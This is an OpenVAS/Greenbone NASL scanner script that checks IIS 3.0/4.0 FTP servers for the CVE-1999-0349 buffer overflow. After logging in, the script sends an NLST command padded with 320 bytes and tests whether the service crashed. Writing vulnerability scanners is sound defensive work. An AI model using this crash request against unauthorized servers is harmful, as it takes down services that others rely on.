# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:ftp_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802440");
  script_version("2023-12-20T05:05:58+0000");
  script_cve_id("CVE-1999-0349");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-07-04 16:21:03 +0530 (Wed, 04 Jul 2012)");
  script_name("Microsoft IIS FTP Server 'Malformed FTP List Request' DOS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("MS/IIS-FTP/Installed");

  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/246545.php");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/192");
  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-003");

  script_tag(name:"impact", value:"Successful exploitation will allow remote users to crash the application
  leading to denial of service condition or execute arbitrary code.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 3.0 and 4.0.");

  script_tag(name:"insight", value:"The FTP service in IIS has an unchecked buffer in a component that processes
  'list' commands. A constructed 'list' request could cause arbitrary code to
  execute on the server via a classic buffer overrun technique.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"summary", value:"This host is missing important security update according to
  Microsoft Bulletin MS99-033.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!ftpLoc = get_app_location(port:ftpPort, cpe:CPE)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

ftplogin = ftp_log_in(socket:soc, user:login, pass:pass);
if(!ftplogin){
  close(soc);
  exit(0);
}

port2 = ftp_pasv(socket:soc);
if(!port2){
  exit(0);
}

soc2 = open_sock_tcp(port2, transport:get_port_transport(ftpPort));

command = strcat('NLST ', crap(320), '\r\n');
send(socket:soc, data:command);

close(soc2);
close(soc);

sleep(7);

soc3 = open_sock_tcp(ftpPort);
if(soc3){
  recv = ftp_recv_line(socket:soc3);
  if(!recv){
    security_message(port:ftpPort);
    exit(0);
  }
  close(soc3);
  exit(99);
}else{
  security_message(port:ftpPort);
  exit(0);
}

exit(99);
